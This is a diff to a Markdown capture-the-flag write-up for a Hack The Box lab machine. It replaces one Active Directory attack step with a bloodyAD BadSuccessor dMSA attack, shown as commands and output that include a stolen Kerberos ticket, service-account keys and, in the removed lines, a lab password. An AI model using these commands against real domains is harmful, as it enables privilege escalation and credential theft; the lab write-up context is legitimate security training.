@@ -1208,33 +1208,60 @@ Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its a
 
 ``` bash
 
-❯ KRB5CCNAME="$PWD/ryan.ccache"
-❯ bloodyAD --host dc01.checkpoint.htb --dc-ip 10.129.113.22 -d checkpoint.htb -k set object 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' msDS-SupersededServiceAccountState -v 3
-[+] CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb's msDS-SupersededServiceAccountState has been updated
+❯ export KRB5CCNAME="$PWD/ryan.ccache"
+
+❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k add badSuccessor svc_pwned -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+[+] Creating DMSA svc_pwned$ in OU=DMSAHolder,DC=checkpoint,DC=htb
+[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+
+Realm        : CHECKPOINT.HTB
+Sname        : krbtgt/CHECKPOINT.HTB
+UserName     : svc_pwned$
+UserRealm    : checkpoint.htb
+StartTime    : 2026-08-29 06:00:14+00:00
+EndTime      : 2026-08-29 15:16:43+00:00
+RenewTill    : 2026-09-05 04:31:08+00:00
+Flags        : forwardable, enc-pa-rep, renewable, pre-authent, forwarded
+Keytype      : 18
+Key          : h0z4ikMkI45n6/cXbmHEDIJtSzTROoFZEBDfeXfqrL4=
+EncodedKirbi :
+
+    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
+    Q0tQT0lOVC5IVEI=
+[+] dMSA TGT stored in ccache file svc_pwned_CQ.ccache
+
+dMSA current keys found in TGS:
+AES256: 336dc68ca79ab26c53a6785dae12591a588f9d7527bd139dc37a5536e8a38d74
+AES128: 953d5a8083870050551c3282116323c0
+RC4: e50211b8d8965d0927a182389b07ef03
+
+dMSA previous keys found in TGS (including keys of preceding managed accounts):
+RC4: e16081eb077aca74bdbf8af12af43ac9
 ╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
 ╰─                                                                                                               ─╯
 
 
 ```
 
-``` bash
 
-❯ bloodyAD --host dc01.checkpoint.htb --dc-ip 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'svc_pwn$' --attr msDS-ManagedPassword
 
-distinguishedName: CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
-❯ impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.113.22
 
-Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies
-
-[*] Saving ticket in alex.turner.ccache
-❯ export KRB5CCNAME=alex.turner.ccache
-
-❯ impacket-getST -dc-ip 10.129.113.22 -spn 'http/dc01.checkpoint.htb' 'checkpoint.htb/svc_pwn$' -k -no-pass -dmsa
-Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies
-
-[*] Getting ST for user
-[*] Saving ticket in svc_pwn$@http_dc01.checkpoint.htb@CHECKPOINT.HTB.ccache
-╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
-╰─                                                                                                               ─╯
-
-```
